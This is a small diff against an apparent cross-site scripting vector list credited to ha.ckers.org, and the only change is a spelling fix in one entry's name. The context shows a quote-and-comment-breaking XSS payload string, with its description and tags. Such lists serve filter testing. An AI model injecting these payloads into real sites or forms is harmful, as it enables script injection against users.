@@ -518,8 +518,8 @@ Exploit Description: HTML entities (the semicolons are required for this to work
 Exploit Tags: general, evil tags, obfuscated, internet explorer
 Author Name: ha.ckers.org
 
-HTML Quoute & Comment breaker
-Exploit Name: HTML Quoute & Comment breaker
+HTML Quote & Comment breaker
+Exploit Name: HTML Quote & Comment breaker
 Exploit String: '';!--"<script>alert(0);</script>=&{(alert(1))}
 Exploit Description: This vector breaks HTML quotes and comments.
 Exploit Tags: general, html breaking, comment breaking
